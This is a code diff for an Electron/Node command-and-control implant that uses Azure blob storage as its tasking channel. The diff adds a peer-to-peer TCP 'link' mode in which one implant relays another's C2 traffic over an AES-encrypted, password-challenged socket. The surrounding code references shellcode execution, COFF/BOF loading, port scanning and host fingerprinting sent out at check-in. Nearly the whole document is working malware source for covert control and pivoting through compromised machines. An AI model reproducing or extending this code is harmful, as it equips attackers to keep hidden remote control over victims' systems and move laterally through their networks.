@@ -10,8 +10,11 @@ const net = require('net');
 let customDnsServer = null;
 const config = require('./config.js');
 
+global.mode             = (!config.mode || (config.mode !== 'egress' && !config.mode.startsWith('link-'))) ? 'egress' : config.mode;
+global.TCPServer        = null;
+global.TCPLinkAgent     = null;
 global.init             = false;
-global.debug            = false;
+global.debug            = true;
 global.mainWindow       = null;
 global.agent            = null;
 global.scexecNodePath   = "./scexec.node";
@@ -20,6 +23,8 @@ global.path_coffloader  = "./COFFLoader.node";
 global.STORAGE_ACCOUNT  = config.storageAccount;
 global.META_CONTAINER   = config.metaContainer;
 global.SAS_TOKEN        = config.sasToken;
+global.P2P_CHALLENGE    = config.metaContainer;
+global.P2P_PORT         = config.p2pPort || null;
 
 class Container {
     constructor() {
@@ -136,6 +141,24 @@ app.on('ready', async () => {
         debug(`\t${JSON.stringify(global.agent.container)}`);
         // Keep trying to initialize until successful
         let failattempts = 0;
+        if (global.mode== 'link-tcp') {
+            debug(`Starting TCP server on port ${global.P2P_PORT}...`);
+            
+            // Create and start the TCP server with configuration from config.js
+            global.TCPServer = new TCPServer(global.P2P_PORT, global.P2P_CHALLENGE, global.agent.agentid);
+            try {
+                await global.TCPServer.start();
+                debug(`TCP server started successfully on port ${global.P2P_PORT}`);
+                
+                // Wait for a client to connect and authenticate
+                debug('Waiting for client to connect and authenticate...');
+                await global.TCPServer.waitForClient();
+                debug('Client connected and authenticated successfully');
+            } catch (error) {
+                debug(`Failed to start TCP server or wait for client: ${error.message}\r\n${error.stack}`);
+                return;
+            }
+        }
         while (true) {
             let initResult = await init();
             if (initResult === true) {
@@ -156,6 +179,569 @@ app.on('ready', async () => {
     }
 }); 
 
+class TCPAgent {
+    constructor(config = {}) {
+        this.config = {
+            hostname: config.hostname,
+            port: config.port,
+            password: config.password,
+            maxReconnectDelay: 30000,
+            initialReconnectDelay: 1000,
+            requestTimeout: 30000
+        };
+
+        this.client = null;
+        this.isConnected = false;
+        this.reconnectAttempts = 0;
+        this.buffer = '';
+        this.p2p_aes = null;
+        this.onMessageCallback =  null;
+        this.onConnectCallback = null;
+        this.onDisconnectCallback = null;
+        this.onErrorCallback = null;
+    }
+
+    async generateKeyAndIV(password) {
+        const salt = 'fixed-salt';
+        const key = crypto.pbkdf2Sync(password, salt, 100000, 32, 'sha256');
+        const iv = crypto.pbkdf2Sync(password, salt + 'iv', 100000, 16, 'sha256').slice(0, 16);
+        return { key, iv };
+    }
+
+    async encrypt(data, key, iv) {
+        const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
+        let encrypted = "";
+        if (Buffer.isBuffer(data)) {
+            encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
+        } else {
+            encrypted = cipher.update(data, 'utf8', 'hex');
+            encrypted += cipher.final('hex');
+        }
+        return encrypted;
+    }
+
+    async decrypt(encryptedData, key, iv) {
+        try {
+            const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
+            let decrypted = "";
+            if (Buffer.isBuffer(encryptedData)) {
+                decrypted = Buffer.concat([decipher.update(encryptedData), decipher.final()]);
+            } else {
+                decrypted = decipher.update(encryptedData, 'hex', 'utf8');
+                decrypted += decipher.final('utf8');
+            }
+            return decrypted;
+        } catch (error) {
+            debug(`Error in decrypt(): ${error} ${error.stack}`);
+            return null;
+        }
+    }
+
+    async base64Encode(input) {
+        try {
+            if (typeof input === 'string') {
+                input = Buffer.from(input, 'utf-8');
+            } else if (!Buffer.isBuffer(input)) {
+                input = Buffer.from(JSON.stringify(input), 'utf-8');
+            }
+            return input.toString('base64');
+        } catch (error) {
+            return null;
+        }
+    }
+
+    async base64Decode(base64) {
+        try {
+            const buffer = Buffer.from(base64, 'base64');
+            return buffer.toString('utf-8');
+        } catch (error) {
+            return null;
+        }
+    }
+
+    async connect() {
+        if (!this.config.hostname || !this.config.port || !this.config.password) {
+            throw new Error('Missing required parameters: hostname, port, and password are required');
+        }
+
+        this.client = new net.Socket();
+        
+        this.client.connect(this.config.port, this.config.hostname, async () => {
+            debug('Connected to server');
+            this.isConnected = true;
+            this.reconnectAttempts = 0;
+            
+            this.p2p_aes = await this.generateKeyAndIV(this.config.password);
+            const encrypted_message = await this.encrypt(this.config.password, this.p2p_aes.key, this.p2p_aes.iv);
+            const encoded_message = await this.base64Encode(encrypted_message);
+            this.client.write(encoded_message + '\n');
+
+            if (this.onConnectCallback) {
+                this.onConnectCallback();
+            }
+        });
+
+        this.setupEventHandlers();
+    }
+
+    setupEventHandlers() {
+        this.client.on('data', async (data) => {
+            const decoded_message = await this.base64Decode(data.toString());
+            const decrypted_message = await this.decrypt(decoded_message, this.p2p_aes.key, this.p2p_aes.iv);
+            this.buffer += decrypted_message;
+            
+            const messages = this.buffer.split('\n');
+            this.buffer = messages.pop();
+
+            for (const message of messages) {
+                if (!message.trim()) continue;
+
+                if (message.trim() === 'AUTH_SUCCESS') {
+                    debug('Authentication successful');
+                    continue;
+                } else if (message.trim() === 'AUTH_FAILED') {
+                    debug('Authentication failed');
+                    this.disconnect();
+                    return;
+                }
+
+                try {
+                    // Parse the web request from server
+                    const currentRequest = JSON.parse(message);
+                    
+                    // Handle x-ms-meta-link header if present
+                    if (currentRequest.headers && currentRequest.headers['x-ms-meta-link']) {
+                        const existingLinks = currentRequest.headers['x-ms-meta-link'];
+                        currentRequest.headers['x-ms-meta-link'] = existingLinks ? `${existingLinks},${global.agent.agentid}` : global.agent.agentid;
+                    }
+
+                    debug('Received web request from server:');
+                    debug(`Task ID: ${currentRequest.taskId}`);
+                    debug(`Agent ID: ${currentRequest.agentId}`);
+                    debug(`URL: ${currentRequest.url}`);
+                    debug(`Method: ${currentRequest.method}`);
+                    debug(`Headers: ${JSON.stringify(currentRequest.headers)}`);
+                    debug(`Body: ${currentRequest.body}`);
+
+                    // Validate required fields
+                    if (!currentRequest.url) {
+                        throw new Error('Missing required field: url');
+                    }
+
+                    const method = currentRequest.method || 'GET';
+                    const headers = currentRequest.headers || {};
+                    const defaultHeaders = {
+                        'Cache-Control': 'no-cache, no-store, must-revalidate',
+                        'Pragma': 'no-cache',
+                        'Expires': '0'
+                    };
+                    // Parse URL to get hostname and path
+                    const urlObj = new URL(currentRequest.url);
+                    const hostname = urlObj.hostname;
+                    const path = urlObj.pathname + urlObj.search;
+                    let fetchOptions = {
+                        hostname: hostname,
+                        path: path,
+                        port: 443,
+                        method: method,
+                        headers: { ...defaultHeaders, ...headers },
+                        signal: AbortSignal.timeout(this.config.requestTimeout)
+                    };
+
+
+                    // Only add body for non-GET/HEAD methods
+                    if (currentRequest.body !== undefined && !['GET', 'HEAD'].includes(method.toUpperCase())) {
+                        if (method === 'PUT' && headers['Content-Type'] === 'text/plain') {
+                            fetchOptions.body = currentRequest.body;
+                        } else {
+                            fetchOptions.body = currentRequest.body;
+                        }
+                    }
+
+                    debug('Sending request with options:', JSON.stringify(fetchOptions, null, 2));
+
+                    try {
+                        //const response = await fetch(currentRequest.url, fetchOptions);
+                        const response = await func_Web_Request(fetchOptions,fetchOptions.body,currentRequest.isBytes);
+                        //func_Web_Request(options, data = null, isBytes = false)
+                        debug(`Response status: ${response.status} ${response.statusText}`);
+                        
+                        let data = "";
+                        if (currentRequest.isBytes) {
+                            const arrayBuffer = await response.data.arrayBuffer();
+                            data = Buffer.from(arrayBuffer);
+                        } else {
+                            data = await response.data;
+                        }
+
+                        // Create response object
+                        const responseObject = {
+                            status: response.status,
+                            statusText: response.statusText,
+                            headers: response.headers,
+                            data: data,
+                            agentId: currentRequest.agentId,
+                            taskId: currentRequest.taskId
+                        };
+
+                        debug(`Response object: ${JSON.stringify(responseObject)}`);
+
+                        // Send response back to server
+                        const encrypted_message = await this.encrypt(JSON.stringify(responseObject) + '\n', this.p2p_aes.key, this.p2p_aes.iv);
+                        const encoded_message = await this.base64Encode(encrypted_message);
+                        this.client.write(encoded_message);
+                        debug('Sent response back to server');
+
+                    } catch (fetchError) {
+                        debug('Fetch error:', fetchError);
+                        if (fetchError.name === 'AbortError') {
+                            throw new Error('Request timed out after ' + this.config.requestTimeout + ' seconds');
+                        }
+                        throw fetchError;
+                    }
+
+                } catch (error) {
+                    debug('Error processing request:', error);
+                    // Send error response back to server
+                    const errorResponse = {
+                        error: error.message,
+                        agentId: currentRequest?.agentId,
+                        taskId: currentRequest?.taskId
+                    };
+
+                    try {
+                        const encrypted_error = await this.encrypt(JSON.stringify(errorResponse) + '\n', this.p2p_aes.key, this.p2p_aes.iv);
+                        const encoded_error = await this.base64Encode(encrypted_error);
+                        this.client.write(encoded_error);
+                        debug('Sent error response to server');
+                    } catch (encryptError) {
+                        debug('Failed to encrypt error response:', encryptError);
+                    }
+                }
+            }
+        });
+
+        this.client.on('end', () => {
+            debug('Connection ended');
+            this.isConnected = false;
+            if (this.onDisconnectCallback) {
+                this.onDisconnectCallback();
+            }
+            //this.attemptReconnect();
+        });
+
+        this.client.on('error', (error) => {
+            debug('Connection error:', error);
+            this.isConnected = false;
+            if (this.onErrorCallback) {
+                this.onErrorCallback(error);
+            }
+            //this.attemptReconnect();
+        });
+    }
+
+    async sendMessage(message) {
+        if (!this.isConnected) {
+            throw new Error('Not connected to server');
+        }
+
+        try {
+            const encrypted_message = await this.encrypt(JSON.stringify(message) + '\n', this.p2p_aes.key, this.p2p_aes.iv);
+            const encoded_message = await this.base64Encode(encrypted_message);
+            this.client.write(encoded_message);
+            return true;
+        } catch (error) {
+            debug('Error sending message:', error);
+            return false;
+        }
+    }
+
+    disconnect() {
+        if (this.client) {
+            this.client.destroy();
+            this.isConnected = false;
+        }
+    }
+
+    attemptReconnect() {
+        if (this.isConnected) return;
+        
+        const delay = Math.min(
+            this.config.initialReconnectDelay * Math.pow(2, this.reconnectAttempts),
+            this.config.maxReconnectDelay
+        );
+        
+        debug(`Attempting to reconnect in ${delay}ms...`);
+        
+        setTimeout(() => {
+            this.reconnectAttempts++;
+            this.connect();
+        }, delay);
+    }
+}
+
+class TCPServer {
+    constructor(port, password, agentId) {
+        this.server = null;
+        this.authenticatedClients = new Set();
+        this.requestQueue = [];
+        this.isProcessingQueue = false;
+        this.clientConnectedPromise = null;
+        this.clientConnectedResolve = null;
+        this.pendingResponses = new Map();
+        this.port = port;
+        this.password = password;
+        this.agentId = agentId;
+    }
+
+    // Start the TCP server
+    async start() {
+        return new Promise((resolve, reject) => {
+            this.server = net.createServer((socket) => {
+                let isAuthenticated = false;
+                let decryptedMessage = '';
+
+                socket.on('data', async (data) => {
+                    decryptedMessage = '';
+                    const message = data.toString();
+                    global.p2p_aes = await generateKeyAndIV(this.password);
+                    try {
+                        const decodedMessage = await func_Base64_Decode(message);
+                        if (!decodedMessage) {
+                            debug('[TCP-SERVER] Failed to decode base64 message');
+                            socket.end();
+                            return;
+                        }
+                        decryptedMessage = await func_Decrypt(decodedMessage, global.p2p_aes.key, global.p2p_aes.iv);
+                        decryptedMessage = decryptedMessage;
+                        if (!decryptedMessage) {
+                            debug('[TCP-SERVER] Failed to decrypt message');
+                            socket.end();
+                            return;
+                        }
+                    } catch (error) {
+                        debug(`[TCP-SERVER] Error processing message: ${error.message}`);
+                        socket.end();
+                        return;
+                    }
+                    debug(`[TCP-SERVER] Received message: ${decryptedMessage}`);
+
+                    if (!isAuthenticated) {
+                        // Check password
+                        if (decryptedMessage === this.password) {
+                            debug('[TCP-SERVER] Authentication successful');
+                            isAuthenticated = true;
+                            this.authenticatedClients.add(socket);
+                            let encrypted_response = await func_Encrypt('AUTH_SUCCESS\n', global.p2p_aes.key, global.p2p_aes.iv);
+                            let encoded_response = await func_Base64_Encode(encrypted_response);
+                            socket.write(encoded_response);
+                            
+                            // Resolve the wait for client promise if it exists
+                            if (this.clientConnectedResolve) {
+                                this.clientConnectedResolve();
+                                this.clientConnectedResolve = null;
+                                this.clientConnectedPromise = null;
+                            }
+                        } else {
+                            debug('[TCP-SERVER] Authentication failed - invalid password');
+                            let encrypted_response = await func_Encrypt('AUTH_FAILED\n', global.p2p_aes.key, global.p2p_aes.iv);
+                            let encoded_response = await func_Base64_Encode(encrypted_response);
+                            socket.write(encoded_response);
+                            socket.end();
+                        }
+                        return;
+                    }
+
+                    try {
+                        // Parse the response from agent
+                        const response = JSON.parse(decryptedMessage);
+                        debug(`[TCP-SERVER] Response with taskId: ${response.taskId}`);
+                        debug(`[TCP-SERVER] Response with agentid: ${response.agentId}`);
+                        const pendingResponse = this.pendingResponses.get(response.taskId);
+                        if (pendingResponse) {
+                            pendingResponse.resolve(response);
+                            this.pendingResponses.delete(response.taskId);
+                        }
+
+                        // Remove the current request from queue and process next
+                        if (this.requestQueue.length > 0) {
+                            this.requestQueue.shift();
+                        }
+                        this.processNextRequest();
+                    } catch (error) {
+                        debug(`[TCP-SERVER] Error parsing response: ${error.message}`);
+                        if (this.requestQueue.length > 0) {
+                            const currentRequest = this.requestQueue[0];
+                            currentRequest.reject(error);
+                            this.requestQueue.shift();
+                        }
+                    }
+                });
+
+                socket.on('end', () => {
+                    debug('[TCP-SERVER] Client disconnected (end event)');
+                    if (isAuthenticated) {
+                        // Reject any pending requests for this client
+                        for (const [taskId, pendingResponse] of this.pendingResponses) {
+                            pendingResponse.reject(new Error('Client disconnected'));
+                            this.pendingResponses.delete(taskId);
+                        }
+                        this.authenticatedClients.delete(socket);
+                        debug(`[TCP-SERVER] Removed client from authenticated clients. Remaining clients: ${this.authenticatedClients.size}`);
+                        
+                        // Reset client connection promise if no clients remain
+                        if (this.authenticatedClients.size === 0) {
+                            this.clientConnectedPromise = null;
+                            this.clientConnectedResolve = null;
+                        }
+                    }
+                });
+
+                socket.on('error', (error) => {
+                    debug(`[TCP-SERVER] Client connection error: ${error.message}`);
+                    if (isAuthenticated) {
+                        // Reject any pending requests for this client
+                        for (const [taskId, pendingResponse] of this.pendingResponses) {
+                            pendingResponse.reject(new Error('Client connection error'));
+                            this.pendingResponses.delete(taskId);
+                        }
+                        this.authenticatedClients.delete(socket);
+                        debug(`[TCP-SERVER] Removed client from authenticated clients due to error. Remaining clients: ${this.authenticatedClients.size}`);
+                    }
+                });
+
+                socket.setTimeout(30000);
+                socket.on('timeout', () => {
+                    debug('[TCP-SERVER] Client connection timed out');
+                    if (isAuthenticated) {
+                        // Reject any pending requests for this client
+                        for (const [taskId, pendingResponse] of this.pendingResponses) {
+                            pendingResponse.reject(new Error('Client connection timeout'));
+                            this.pendingResponses.delete(taskId);
+                        }
+                        this.authenticatedClients.delete(socket);
+                        debug(`[TCP-SERVER] Removed client from authenticated clients due to timeout. Remaining clients: ${this.authenticatedClients.size}`);
+                    }
+                    //socket.end();
+                    TaskLoop();
+                });
+            });
+
+            this.server.listen(this.port, () => {
+                resolve();
+            });
+
+            this.server.on('error', (error) => {
+                reject(error);
+            });
+        });
+    }
+
+    // Wait for a client to connect and authenticate
+    waitForClient() {
+        if (this.authenticatedClients.size > 0) {
+            return Promise.resolve();
+        }
+
+        // Reset the promise if it was previously resolved/rejected
+        this.clientConnectedPromise = null;
+        this.clientConnectedResolve = null;
+
+        // Create new promise to wait for client - no timeout
+        this.clientConnectedPromise = new Promise((resolve) => {
+            this.clientConnectedResolve = resolve;
+        });
+
+        return this.clientConnectedPromise;
+    }
+
+    // Stop the TCP server
+    stop() {
+        return new Promise((resolve) => {
+            if (this.server) {
+                this.server.close(() => {
+                    resolve();
+                });
+            } else {
+                resolve();
+            }
+        });
+    }
+
+    // Generate a random task ID
+    generateTaskId() {
+        return crypto.randomBytes(4).toString('hex');
+    }
+
+    // Process the next request in the queue
+    async processNextRequest() {
+        if (this.requestQueue.length === 0) {
+            this.isProcessingQueue = false;
+            return;
+        }
+
+        const request = this.requestQueue[0];
+        const client = this.getNextAuthenticatedClient();
+
+        if (!client) {
+            while (this.requestQueue.length > 0) {
+                const queuedRequest = this.requestQueue.shift();
+                queuedRequest.reject(new Error('No authenticated clients available'));
+            }
+            this.isProcessingQueue = false;
+            return;
+        }
+
+        const taskId = this.generateTaskId();
+        const requestWithIds = {
+            ...request,
+            taskId,
+            agentId: this.agentId
+        };
+
+        this.pendingResponses.set(taskId, {
+            resolve: request.resolve,
+            reject: request.reject
+        });
+        let requests = JSON.stringify(requestWithIds) + '\n'
+        let encrypted_requests = await func_Encrypt(requests, global.p2p_aes.key, global.p2p_aes.iv);
+        let encoded_requests = await func_Base64_Encode(encrypted_requests);
+
+        client.write(encoded_requests);
+    }
+
+    // Get the next available authenticated client
+    getNextAuthenticatedClient() {
+        return this.authenticatedClients.size > 0 
+            ? Array.from(this.authenticatedClients)[0] 
+            : null;
+    }
+
+    // Add a web request to the queue
+    async makeWebRequest(request) {
+        return new Promise((resolve, reject) => {
+            if (this.authenticatedClients.size === 0) {
+                debug('[TCP-SERVER] No authenticated clients available');
+                resolve(false);
+                return;
+            }
+
+            const requestWithCallback = {
+                ...request,
+                resolve,
+                reject
+            };
+
+            this.requestQueue.push(requestWithCallback);
+
+            if (!this.isProcessingQueue) {
+                this.isProcessingQueue = true;
+                this.processNextRequest();
+            }
+        });
+    }
+}
+
 function generateAESKey()
 {
     const key_material = { 
@@ -164,6 +750,20 @@ function generateAESKey()
     };
     return key_material;
 }
+
+// Function to generate key and IV from a password
+async function generateKeyAndIV(password) {
+    // Use PBKDF2 to derive a key from the password
+    const salt = 'fixed-salt'; // In production, you might want to use a random salt
+    const key = crypto.pbkdf2Sync(password, salt, 100000, 32, 'sha256'); // 32 bytes for AES-256 key
+    const iv = crypto.pbkdf2Sync(password, salt + 'iv', 100000, 16, 'sha256').slice(0, 16); // 16 bytes for IV
+    
+    return {
+        key: key,
+        iv: iv
+    };
+}
+
 
 function generateUUID(len) {
     if (len > 20) len = 20; // Limit max length to 20
@@ -243,9 +843,31 @@ async function func_Web_Request(options, data = null, isBytes = false) {
             global.mainWindow.webContents.once('did-finish-load', resolve);
         });
     }
+    const url = `https://${options.hostname}${options.path}`;
+    const requestId = Date.now().toString();
+    if (data) {
+        if (!options.headers) {
+            options.headers = {};
+        }
+        options.headers['Content-Length'] = Buffer.byteLength(data);
+    }
+    const requestObject = {
+      url:url,
+      method: options.method,
+      headers: options.headers,
+      body: data,
+      isBytes: isBytes
+    }
+    if (global.mode== 'link-tcp') {
+      requestObject.requestId = requestId;
+      requestObject.isBytes = isBytes;
+      const response = await global.TCPServer.makeWebRequest(requestObject);
+      debug(`[WEB-REQUEST] Response : ${JSON.stringify(response)}`);
+      return response;
+    }
     return new Promise((resolve, reject) => {
-        const url = `https://${options.hostname}:${options.port}${options.path}`;
-        const requestId = Date.now().toString();
+        //const url = `https://${options.hostname}:${options.port}${options.path}`;
+        //const requestId = Date.now().toString();
         const responseHandler = (event, response) => {
             debug(`[WEB-REQUEST] Response status: ${response.status}`);
             if (response.error) {
@@ -290,7 +912,6 @@ async function func_Web_Request(options, data = null, isBytes = false) {
     });
 }
 
-
 async function func_Blob_Stat(container, blob) {
   let options = {
       hostname: global.agent.storageAccount,
@@ -306,7 +927,6 @@ async function func_Blob_Stat(container, blob) {
   return response.status === 200;
 }
 
-
 async function func_Blob_Create(ContainerName, StorageBlob, data) {
     try {
         debug(`[BLOB_CREATE] blob : /${ContainerName}/${StorageBlob}`);
@@ -314,8 +934,6 @@ async function func_Blob_Create(ContainerName, StorageBlob, data) {
             data = "";
         }
         data = data.toString();
-        let blob_stat = await func_Blob_Stat(ContainerName, StorageBlob);
-        if (blob_stat === false) {
         const options = {
             hostname: global.agent.storageAccount,
             port: 443,
@@ -328,13 +946,11 @@ async function func_Blob_Create(ContainerName, StorageBlob, data) {
                 'Content-Type': 'text/plain',
                 'Content-Length': Buffer.byteLength(data)
             }
-            };
-            let response = await func_Web_Request(options, data);
-            return response.status === 201;
-        }
-        return blob_stat;
+        };
+        let response = await func_Web_Request(options, data);
+        return response.status === 201;
     } catch (error) {
-        console.error(`Error in func_Blob_Create() : ${error}`);
+        debug(`Error in func_Blob_Create() : ${error}`);
         return false;
     }
 }
@@ -419,47 +1035,38 @@ async function Blob_Set_Metadata(container, blob, metadata) {
 }
 
 async function getSystemInfo() {
-    try
-    {
-      let hostname = os.hostname();
-  
-      const username  = os.userInfo().username;
-      const osType    = os.type();
-      const osRelease = os.release();
-      const platform  = os.platform();
-      const arch      = os.arch();
-      
-      const PID       = process.pid;
-      let procName  = process.argv[ 0 ];
-      procName = procName.trim().replace(/Helper \(Renderer\)/g, "").trim();
-      debug(`procName: ${procName}`);
-      const nets      = os.networkInterfaces();
-      const IpInfo    = []
-      for (const name of Object.keys(nets)) {
-          for (const net of nets[name]) {
-              // 'IPv4' is in Node <= 17, from 18 it's a number 4 or 6
-              const familyV4Value = typeof net.family === 'string' ? 'IPv4' : 4
-              if (net.family === familyV4Value && !net.internal) {
-                  IpInfo.push( net.address );
-              }
-          }
-      }
-      // Create a JSON object with the collected information
-      const systemInfo = {
-        hostname:  hostname,
-        username:  username,
-        osType:    osType,
-        osRelease: osRelease,
-        platform:  platform,
-        arch:      arch,
-        PID:       PID,
-        Process:   procName,
-        IP:        IpInfo
-      };
-      return systemInfo;
-    }catch (error) {
-      debug(`${error} ${error.stack}`);
-      return 0;
+    try {
+        if (!global.mainWindow || global.mainWindow.isDestroyed()) {
+            debug('Main window is not available');
+            global.mainWindow = await createWindow();
+        }
+        if (global.mainWindow.webContents.isLoading()) {
+            await new Promise(resolve => {
+                global.mainWindow.webContents.once('did-finish-load', resolve);
+            });
+        }
+
+        return new Promise((resolve, reject) => {
+            const requestId = Date.now().toString();
+            
+            const responseHandler = (event, systemInfo) => {
+                ipcMain.removeListener(`system-info-response-${requestId}`, responseHandler);
+                resolve(systemInfo);
+            };
+
+            ipcMain.once(`system-info-response-${requestId}`, responseHandler);
+            
+            global.mainWindow.webContents.send('get-system-info', requestId, global.mode);
+
+            // Add timeout
+            setTimeout(() => {
+                ipcMain.removeListener(`system-info-response-${requestId}`, responseHandler);
+                reject(new Error('System info request timed out'));
+            }, 5000);
+        });
+    } catch (error) {
+        debug(`Error getting system info: ${error} ${error.stack}`);
+        return 0;
     }
 }
 
@@ -589,144 +1196,6 @@ async function send_output(container,outblob,output) {
         debug(`Error in send-output() : ${error} ${error.stack}`);
     }
 };
-
-async function init() {
-    try {
-        let response = null;
-        let blobs = global.agent.container.blobs;
-        // Create the metaContainer if it doesn't exist
-        debug(`[INIT] Creating metaContainer ${global.agent.metaContainer}`);
-        response = await func_Container_Create(global.agent.metaContainer);
-        if (response === false) {
-            debug(`[INIT][!] Failed to create meta container : ${global.agent.metaContainer}`);
-            return false;
-        }
-        // Create the metacontainer blob for this agent. Used to register the agent to the client dashboard table
-        debug(`[INIT] Creating metaContainer blob /${global.agent.metaContainer}/${global.agent.agentid}`);
-        response = await func_Blob_Create(global.agent.metaContainer, global.agent.agentid, global.agent.container.name);
-        if(response === false) {
-            debug(`[INIT][!] Failed to create meta container blob : ${global.agent.metaContainer} ${global.agent.agentid}`);
-            return false;
-        }
-        response = await Blob_Set_Metadata(
-          global.agent.metaContainer, 
-          global.agent.agentid, 
-          {
-            stat:      Date.now(),
-            signature: await func_Base64_Encode(JSON.stringify(global.agent.container.key.key)),
-            hash:      await func_Base64_Encode(JSON.stringify(global.agent.container.key.iv))
-          }
-        );
-        if(response.status != 200) {
-            debug(`[INIT][!] Failed to set metadata for meta container blob : ${global.agent.metaContainer} ${global.agent.agentid}`);
-            return false;
-        }
-        // Create agent container
-        debug(`[INIT] Creating agent container ${global.agent.container.name}`);
-        response = await func_Container_Create(global.agent.container.name);
-        if (response === false) {
-            debug(`[INIT][!] Failed to create agent container : ${global.agent.container.name}`);
-            return false;
-        }
-        // Create input blob
-        response = await func_Blob_Create(global.agent.container.name, blobs['in']);
-        if(response === false) {
-            debug(`[INIT][!] Failed to create container blob ${global.agent.container.name} ${blobs['in']}`);
-            return false;
-        }
-        // Create checkin blob
-        let selfInfo = await getSystemInfo();
-        const checkin_encryptedData = await func_Encrypt(JSON.stringify(selfInfo, null, 1), global.agent.container.key.key, global.agent.container.key.iv);
-        const checkin_b64EncData = await func_Base64_Encode(checkin_encryptedData);
-        response = await func_Blob_Create(global.agent.container.name, blobs['checkin'], checkin_b64EncData);
-        if(response === false) {
-            debug(`[INIT][!] Failed to create container blob ${global.agent.container.name} ${blobs['checkin']}`);
-            return false;
-        }
-        return true;
-    } catch (error) {
-        debug(`[INIT][!] ERROR : \r\n${error}\r\n ${error.stack}`);
-        return false;
-    }
-}
-
-async function reinitializeAgent() {
-  debug(`[REINIT] Reinitializing agent`);
-  global.init = false;
-  let failattempts = 0;
-  while (true) {
-      let initResult = await init();
-      if (initResult === true) {
-          debug('[REINIT] Initialization successful');
-          break;
-      }
-      else{
-          failattempts++;
-          debug(`[REINIT] Initialization failed for ${failattempts} time, retrying in 10 seconds... `);
-          await new Promise(resolve => setTimeout(resolve, 10000));
-      }
-  }
-}
-
-async function TaskLoop() {
-  try{
-    debug(`[TASKLOOP] Starting task handler`);
-    while (true) {
-        if (!global.init) {
-            let agentidresp = await func_Blob_Read(global.agent.metaContainer, global.agent.agentid);
-            debug(`[TASKLOOP] func_Blob_Read response : ${JSON.stringify(agentidresp)}`);
-            if (agentidresp.status === 200) {
-                if (agentidresp.data == global.agent.container.name) {
-                    debug(`[TASKLOOP] Agents metaContainer global.agent.agentid ${global.agent.agentid} is initialized with value ${agentidresp.data}`);
-                    global.init = true;
-                }
-            }
-        }else{
-            let response = await Blob_Set_Metadata(
-              global.agent.metaContainer, 
-              global.agent.agentid, 
-              {
-                stat:      Date.now(),
-                signature: await func_Base64_Encode(JSON.stringify(global.agent.container.key.key)),
-                hash:      await func_Base64_Encode(JSON.stringify(global.agent.container.key.iv))
-              }
-            );
-            if(response.status != 200) { await reinitializeAgent(); }
-            if( await HandleTask() === false) { await reinitializeAgent(); }
-        }
-        if (900 * 1000 > global.agent.thissleep && global.agent.thissleep > 1 * 888) {
-            global.agent.thissleep = await getrand(global.agent.sleepinterval * 1000, global.agent.sleepjitter);
-            debug(`[TASKLOOP] Sleeping for ${global.agent.thissleep}`);
-            await new Promise(resolve => setTimeout(resolve, global.agent.thissleep));
-        } else {
-            debug('[TASKLOOP] Sleeping for default 10 seconds');
-            await new Promise(resolve => setTimeout(resolve, 10000));
-        }
-    }
-  }catch(error){
-    debug(`${error} ${error.stack}`);
-    await TaskLoop();
-  }
-}
-
-async function HandleTask() {
-    try {
-        let response = await func_Blob_Read(global.agent.container.name ,global.agent.container.blobs['in']);
-        if (response.status === 200) {
-            await clearBlob(global.agent.container.name, global.agent.container.blobs['in']);
-            if (response.data && response.data != null && response.data != undefined && response.data != "") {
-                let task = await parseTask(response.data);
-                await DoTask(task);
-            } 
-            return true;
-        }else{
-            return false;
-        }
-    } catch (error) {
-        debug(`[!] ${error} ${error.stack}`);
-        return false;
-    }
-}
 
 async function func_Scan_Ports(host, ports) {
     const openPorts = [];
@@ -866,6 +1335,50 @@ async function func_Drives_List() {
       }
     }
     return resultBuffer;
+}
+  
+// link localhost 3000 secret123
+function linkHandler(argv) {
+    let link_host = argv[1];
+    let link_port = argv[2];
+    let output = "";
+    output = `Linking to ${link_host}:${link_port}\r\n`;
+    debug(output);
+    global.TCPLinkAgent = new TCPAgent({
+        hostname: link_host,
+        port: link_port,
+        password: global.P2P_CHALLENGE,
+        onMessage: async (message) => {
+            // Handle incoming messages
+            debug(`Received message: ${message}`);
+        },
+        onConnect: () => {
+            debug(`Connected to server`);
+        },
+        onDisconnect: () => {
+            debug(`Disconnected from server`);
+        },
+        onError: (error) => {
+            debug(`Connection error: ${error}`);
+        }
+    });
+    global.TCPLinkAgent.connect();
+    return output;
+}
+
+// link localhost 3000 secret123
+function unlinkHandler(argv) {
+    let link_host = argv[1];
+    let output = "";
+    if (link_host === global.TCPLinkAgent.hostname) {
+        output = `Unlinking from ${link_host}`;
+        debug(output);
+        global.TCPLinkAgent.disconnect();
+    } else {
+        output = `Not linked to ${link_host}`;
+        debug(output);
+    }
+    return output;
 }
   
 async function ls(dirPath) {
@@ -1275,6 +1788,41 @@ async function func_Azure_BOF_Download_Exec(task, argv)
     }
 }
 
+
+async function func_cd(newPath) {
+    try {
+        let targetPath;
+        let currentPath = global.agent.cwd;
+        if (newPath == undefined) { newPath = os.homedir(); }
+        if (path.isAbsolute(newPath)) {
+            targetPath = newPath;
+        } else {
+            if (newPath.startsWith('./') || newPath.startsWith('.\\')) {
+                newPath = newPath.substring(2);
+            }
+            while (newPath.startsWith('../') || newPath.startsWith('..\\')) {
+                currentPath = path.dirname(currentPath);
+                newPath = newPath.substring(3);
+            }
+            targetPath = path.join(currentPath, newPath);
+        }
+        targetPath = path.normalize(targetPath);
+        try {
+            const stats = await fsp.stat(targetPath);
+            if (!stats.isDirectory()) {
+                return `[!] Error: ${targetPath} is not a directory`;
+            }
+        } catch (error) {
+            return `[!] Error: Directory ${targetPath} does not exist`;
+        }
+        global.agent.cwd = targetPath;
+        return `Changed directory to ${global.agent.cwd}`;
+    } catch (error) {
+        debug(`[!] Error in func_cd: ${error.message}${error.stack}`);
+        return `[!] Error changing directory: ${error.message}`;
+    }
+}
+
 // Function to simulate doing some work with the blob content
 async function func_Command_Handler(task, argv) 
 {
@@ -1365,6 +1913,10 @@ async function func_Command_Handler(task, argv)
             }
           } else if (argv[0] == 'dns') {
             data = await dnsHandler(cmd);
+          } else if (argv[0] == 'link') {
+            data = linkHandler(argv);
+          } else if (argv[0] == 'unlink') {
+            data = unlinkHandler(argv);
           } else if (argv[0] == 'set') {
             if (argv[1] == 'scexec_path') {
               global.scexecNodePath   = argv[2];
@@ -1477,36 +2029,160 @@ async function DoTask(task) {
     }
 }
 
-async function func_cd(newPath) {
+
+async function init() {
     try {
-        let targetPath;
-        let currentPath = global.agent.cwd;
-        if (newPath == undefined) { newPath = os.homedir(); }
